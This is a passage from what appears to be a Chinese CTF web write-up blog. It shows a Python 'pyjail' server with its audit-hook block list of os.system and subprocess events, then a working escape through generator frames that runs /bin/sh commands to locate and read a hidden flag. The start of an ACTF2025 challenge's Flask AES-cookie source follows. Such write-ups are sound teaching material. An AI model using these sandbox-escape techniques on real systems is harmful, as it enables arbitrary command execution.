language_">self</span>.generic_visit(node)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">safe_exec</span>(<span class="hljs-params">code: <span class="hljs-built_in">str</span>, sandbox_globals=<span class="hljs-literal">None</span></span>):<br>    original_stdout = sys.stdout<br>    original_stderr = sys.stderr<br><br>    sys.stdout = io.StringIO()<br>    sys.stderr = io.StringIO()<br><br>    <span class="hljs-keyword">if</span> sandbox_globals <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        sandbox_globals = &#123;<br>            <span class="hljs-string">&quot;__builtins__&quot;</span>: &#123;<br>                <span class="hljs-string">&quot;print&quot;</span>: <span class="hljs-built_in">print</span>,<br>                <span class="hljs-string">&quot;any&quot;</span>: <span class="hljs-built_in">any</span>,<br>                <span class="hljs-string">&quot;len&quot;</span>: <span class="hljs-built_in">len</span>,<br>                <span class="hljs-string">&quot;RuntimeError&quot;</span>: RuntimeError,<br>                <span class="hljs-string">&quot;addaudithook&quot;</span>: sys.addaudithook,<br>                <span class="hljs-string">&quot;original_stdout&quot;</span>: original_stdout,<br>                <span class="hljs-string">&quot;original_stderr&quot;</span>: original_stderr<br>            &#125;<br>        &#125;<br><br>    <span class="hljs-keyword">try</span>:<br>        tree = ast.parse(code)<br>        SandboxVisitor().visit(tree)<br><br>        <span class="hljs-built_in">exec</span>(code, sandbox_globals)<br>        output = sys.stdout.getvalue()<br><br>        sys.stdout = original_stdout<br>        sys.stderr = original_stderr<br><br>        <span class="hljs-keyword">return</span> output, sandbox_globals<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        sys.stdout = original_stdout<br>        sys.stderr = original_stderr<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Error: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>, sandbox_globals<br><br><br>CODE = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">def my_audit_checker(event, args):</span><br><span class="hljs-string">    blocked_events = [</span><br><span class="hljs-string">        &quot;import&quot;, &quot;time.sleep&quot;, &quot;builtins.input&quot;, &quot;builtins.input/result&quot;, &quot;open&quot;, &quot;os.system&quot;,</span><br><span class="hljs-string">         &quot;eval&quot;,&quot;subprocess.Popen&quot;, &quot;subprocess.call&quot;, &quot;subprocess.run&quot;, &quot;subprocess.check_output&quot;</span><br><span class="hljs-string">    ]</span><br><span class="hljs-string">    if event in blocked_events or event.startswith(&quot;subprocess.&quot;):</span><br><span class="hljs-string">        raise RuntimeError(f&quot;Operation not allowed: &#123;event&#125;&quot;)</span><br><span class="hljs-string"></span><br><span class="hljs-string">addaudithook(my_audit_checker)</span><br><span class="hljs-string"></span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Handler</span>(socketserver.BaseRequestHandler):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">handle</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Welcome to Interactive Pyjail!\n&quot;</span>)<br>        <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Rules: No import / No sleep / No input\n\n&quot;</span>)<br><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;========= Server Source Code =========\n&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.sendall(source_code.encode() + <span class="hljs-string">b&quot;\n&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;========= End of Source Code =========\n\n&quot;</span>)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Failed to load source code.\n&quot;</span>)<br>            <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-built_in">str</span>(e).encode() + <span class="hljs-string">b&quot;\n&quot;</span>)<br><br>        <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Type your code line by line. Type &#x27;exit&#x27; to quit.\n\n&quot;</span>)<br><br>        prefix_code = CODE<br>        sandbox_globals = <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;&gt;&gt;&gt; &quot;</span>)<br>            <span class="hljs-keyword">try</span>:<br>                user_input = <span class="hljs-variable language_">self</span>.request.recv(<span class="hljs-number">4096</span>).decode().strip()<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> user_input:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> user_input.lower() == <span class="hljs-string">&quot;exit&quot;</span>:<br>                    <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Bye!\n&quot;</span>)<br>                    <span class="hljs-keyword">break</span><br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(user_input) &gt; <span class="hljs-number">100</span>:<br>                    <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">b&quot;Input too long (max 100 chars)!\n&quot;</span>)<br>                    <span class="hljs-keyword">continue</span><br><br>                full_code = prefix_code + user_input + <span class="hljs-string">&quot;\n&quot;</span><br>                prefix_code = <span class="hljs-string">&quot;&quot;</span><br><br>                result, sandbox_globals = safe_exec(full_code, sandbox_globals)<br>                <span class="hljs-variable language_">self</span>.request.sendall(result.encode() + <span class="hljs-string">b&quot;\n&quot;</span>)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-variable language_">self</span>.request.sendall(<span class="hljs-string">f&quot;Error occurred: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>\n&quot;</span>.encode())<br>                <span class="hljs-keyword">break</span><br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    HOST, PORT = <span class="hljs-string">&quot;0.0.0.0&quot;</span>, <span class="hljs-number">5000</span><br>    <span class="hljs-keyword">with</span> socketserver.ThreadingTCPServer((HOST, PORT), Handler) <span class="hljs-keyword">as</span> server:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;Server listening on <span class="hljs-subst">&#123;HOST&#125;</span>:<span class="hljs-subst">&#123;PORT&#125;</span>&quot;</span>)<br>        server.serve_forever()<br></code></pre></td></tr></table></figure><p>ç”Ÿæˆå™¨æ ˆå¸§é€ƒé€¸ï¼š <a href="https://www.cnblogs.com/gaorenyusi/p/18242719">https://www.cnblogs.com/gaorenyusi/p/18242719</a></p><p>æ‹¿åˆ°execå¤–éƒ¨globals, ç„¶åé‡å†™visit_Attribute</p><p>osæ¨¡å—æ²¡banå®Œå°±banäº†æœ€å¸¸è§çš„system,popen</p><p>å›æ˜¾å› ä¸ºæœ‰â€original_stdoutâ€: original_stdoutå¾ˆå®¹æ˜“è¯»å‡ºæ¥</p><p>é•¿åº¦100é™åˆ¶åªéœ€å°†ä»£ç å†™æˆ<code>exec(&quot;code&quot;)</code>, codeéƒ¨åˆ†æ‹¼æ¥å°±è¡Œ</p><p>ç„¶åflag.txtå‘Šè¯‰flagæœ€åä¿®æ”¹æ—¶é—´2025.5.1 findæ‰¾å°±è¡Œäº†ï¼ˆæˆ–è€…ç›´æ¥çœ‹start.shèƒ½çœ‹åˆ°flagåœ¨å“ªï¼‰flagä½ç½®ï¼š<code>/tmp/.\x0a\x0b\x00hidden/flagD</code></p><p><code>cat /tmp/.*/flagD</code>å°±è¡Œ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>a = (a.gi_frame.f_back.f_back <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> [<span class="hljs-number">1</span>])<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> a][<span class="hljs-number">0</span>]<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">globals</span> = a.f_back.f_back.f_globals<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;SandboxVisitor&#x27;</span>].visit_Attribute=<span class="hljs-keyword">lambda</span> x,y:<span class="hljs-literal">None</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>os=<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;os&quot;</span>)<br><br><span class="hljs-meta">&gt;&gt;&gt; </span>sys=<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;sys&quot;</span>)<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">iter</span>=<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">iter</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">exec</span>=<span class="hljs-built_in">globals</span>[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">exec</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a=<span class="hljs-string">&#x27;run_command = lambda cmd: ((lambda r, w, pid: ((pid == 0 and (os.close(r), os.dup2(w,&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a+=<span class="hljs-string">&#x27;original_stdout.fileno()),os.dup2(w, original_stdout.fileno()),os.execlp(&quot;/bin/sh&quot;, &quot;sh&quot;&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a+=<span class="hljs-string">&#x27;, &quot;-c&quot;, cmd) )) or (os.close(w), (output :=b&quot;&quot;.join(iter(lambda: os.read(r, 4096), b&quot;&quot;))&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span>a+=<span class="hljs-string">&#x27;.decode()),os.close(r), os.waitpid(pid, 0),output )[4] ))(*os.pipe(), os.fork()))&#x27;</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">exec</span>(a)<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(run_command(<span class="hljs-string">&quot;find / -type f -newermt &#x27;2025-05-01 00:00:00&#x27; ! -newermt &#x27;2025-05-02 00:00:00&#x27;&quot;</span>))<br>/tmp/.\x0a\x0b\x00hidden/flagD<br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">print</span>(run_command(<span class="hljs-string">&#x27;cat /tmp/.*/flagD&#x27;</span>))<br>miniLCTF&#123;Fl4G-GeNER4ted_In_M1niIctf2OZS_with_IOvE286&#125;<br></code></pre></td></tr></table></figure><p>è¿™é‡Œå®é™…run_commandå°±æ˜¯</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br>run_command = <span class="hljs-keyword">lambda</span> cmd: (<br>    (<span class="hljs-keyword">lambda</span> r, w, pid: (<br>        (pid == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (<br>            os.close(r),<br>            os.dup2(w, sys.stdout.fileno()),<br>            os.dup2(w, sys.stderr.fileno()),<br>            os.execlp(<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd)<br>        )) <span class="hljs-keyword">or</span> (<br>            os.close(w),<br>            (output := <span class="hljs-string">b&quot;&quot;</span>.join(<span class="hljs-built_in">iter</span>(<span class="hljs-keyword">lambda</span>: os.read(r, <span class="hljs-number">4096</span>), <span class="hljs-string">b&quot;&quot;</span>)).decode()),<br>            os.close(r),<br>            os.waitpid(pid, <span class="hljs-number">0</span>),<br>            output<br>        )[<span class="hljs-number">4</span>]<br>    ))(*os.pipe(), os.fork())<br>)<br><br><span class="hljs-built_in">print</span>(run_command(<span class="hljs-string">&quot;ls&quot;</span>))<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ç”¨å…¶ä»–åº•å±‚çš„oså‡½æ•°</p><p>æ¯”å¦‚os.execvp os.forkpty os.spawnå¯ä»¥è‡ªå·±è¯•è¯•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_command</span>(<span class="hljs-params">cmd</span>):<br>    r, w = os.pipe()<br>    pid = os.fork()<br>    <span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:<br>        os.close(r)<br>        os.dup2(w, <span class="hljs-number">1</span>)<br>        os.dup2(w, <span class="hljs-number">2</span>)<br>        os.close(w)<br>        os.execvp(<span class="hljs-string">&quot;/bin/sh&quot;</span>, [<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd])<br>        os._exit(<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">else</span>:<br>        os.close(w)<br>        <span class="hljs-keyword">with</span> os.fdopen(r) <span class="hljs-keyword">as</span> f:<br>            output = f.read()<br>        os.waitpid(pid, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> output<br><br><span class="hljs-built_in">print</span>(run_command(<span class="hljs-string">&quot;ls -l&quot;</span>))<br><br><br><br><span class="hljs-keyword">import</span> os<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_command</span>(<span class="hljs-params">cmd</span>):<br>    pid, fd = os.forkpty()<br>    <span class="hljs-keyword">if</span> pid == <span class="hljs-number">0</span>:<br>        os.execvp(<span class="hljs-string">&quot;sh&quot;</span>, [<span class="hljs-string">&quot;sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd])<br>    <span class="hljs-keyword">else</span>:<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            <span class="hljs-keyword">try</span>:<br>                data = os.read(fd, <span class="hljs-number">1024</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data:<br>                    <span class="hljs-keyword">break</span><br>                output += data<br>            <span class="hljs-keyword">except</span> OSError:<br>                <span class="hljs-keyword">break</span><br>        os.waitpid(pid, <span class="hljs-number">0</span>)<br>        <span class="hljs-keyword">return</span> output.decode()<br><br><span class="hljs-built_in">print</span>(run_command(<span class="hljs-string">&quot;ls -l&quot;</span>))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>æŠ€æœ¯</category>
      
      <category>ctf</category>
      
      <category>web</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ACTF2025-Web-WriteUp</title>
    <link href="/2025/04/29/ACTF2025-Web-WriteUp/"/>
    <url>/2025/04/29/ACTF2025-Web-WriteUp/</url>
    
    <content type="html"><![CDATA[<h2 id="not-so-web-1"><a href="#not-so-web-1" class="headerlink" title="not so web 1"></a>not so web 1</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64, json, time<br><span class="hljs-keyword">import</span> os, sys, binascii<br><span class="hljs-keyword">from</span> dataclasses <span class="hljs-keyword">import</span> dataclass, asdict<br><span class="hljs-keyword">from</span> typing <span class="hljs-keyword">import</span> <span class="hljs-type">Dict</span>, <span class="hljs-type">Tuple</span><br><span class="hljs-keyword">from</span> secret <span class="hljs-keyword">import</span> KEY, ADMIN_PASSWORD<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><span class="hljs-keyword">from</span> Crypto.Util.Padding <span class="hljs-keyword">import</span> pad, unpad<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> (<br>    Flask,<br>    render_template,<br>    render_template_string,<br>    request,<br>    redirect,<br>    url_for,<br>    flash,<br>    session,<br>)<br><br>app = Flask(__name__)<br>app.secret_key = KEY<br><br><br><span class="hljs-meta">@dataclass(<span class="hljs-params">kw_only=<span class="hljs-literal">True</span></span>)</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">APPUser</span>:<br>    name: <span class="hljs-built_in">str</span><br>    password_raw: <span class="hljs-built_in">str</span><br>    register_time: <span class="hljs-built_in">int</span><br><br><br><span class="hljs-comment">#  In-memory store for user registration</span><br>users: <span class="hljs-type">Dict</span>[<span class="hljs-built_in">str</span>, APPUser] = &#123;<br>    <span class="hljs-string">&quot;admin&quot;</span>: APPUser(name=<span class="hljs-string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="hljs-number">1</span>)<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">validate_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        cookie_json = cipher.decrypt(padded)<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">try</span>:<br>        _ = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">parse_cookie</span>(<span class="hljs-params">cookie: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Tuple</span>[<span class="hljs-built_in">bool</span>, <span class="hljs-built_in">str</span>]:<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> cookie:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_encrypted = base64.b64decode(cookie, validate=<span class="hljs-literal">True</span>)<br>    <span class="hljs-keyword">except</span> binascii.Error:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(cookie_encrypted) &lt; <span class="hljs-number">32</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        iv, padded = cookie_encrypted[:<span class="hljs-number">16</span>], cookie_encrypted[<span class="hljs-number">16</span>:]<br>        cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>        decrypted = cipher.decrypt(padded)<br>        cookie_json_bytes = unpad(decrypted, <span class="hljs-number">16</span>)<br>        cookie_json = cookie_json_bytes.decode()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        cookie_dict = json.loads(cookie_json)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>, <span class="hljs-string">&quot;&quot;</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>, cookie_dict.get(<span class="hljs-string">&quot;name&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_cookie</span>(<span class="hljs-params">user: APPUser</span>) -&gt; <span class="hljs-built_in">str</span>:<br>    cookie_dict = asdict(user)<br>    cookie_json = json.dumps(cookie_dict)<br>    cookie_json_bytes = cookie_json.encode()<br>    iv = os.urandom(<span class="hljs-number">16</span>)<br>    padded = pad(cookie_json_bytes, <span class="hljs-number">16</span>)<br>    cipher = AES.new(KEY, AES.MODE_CBC, iv)<br>    encrypted = cipher.encrypt(padded)<br>    <span class="hljs-keyword">return</span> base64.b64encode(iv + encrypted).decode()<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> validate_cookie(request.cookies.get(<span class="hljs-string">&quot;jwbcookie&quot;</span>)):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;home&quot;</span>))<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/register&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">&quot;POST&quot;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">register</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&quot;POST&quot;</span>:<br>        user_name = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        password = request.form[<span class="hljs-string">&quot;password&quot;</span>]<br>        <span class="hljs-keyword">if</span> user_name <span class="hljs-keyword">in</span> users:<br>            flash(<span class="hljs-string">&quot;Username already exists!&quot;</span>, <span class="hljs-string">&quot;danger&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            users[user_name] = APPUser(<br>                name=user_name, password_raw=password, register_time=<span class="hljs-built_in">int</span>(time.time())<br>            )<br>            flash(<span class="hljs-string">&quot;Registration successful! Please login.&quot;</span>, <span class="hljs-string">&quot;success&quot;</span>)<br>            <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&quot;login&quot;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;register.html&quot;</span>)<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span 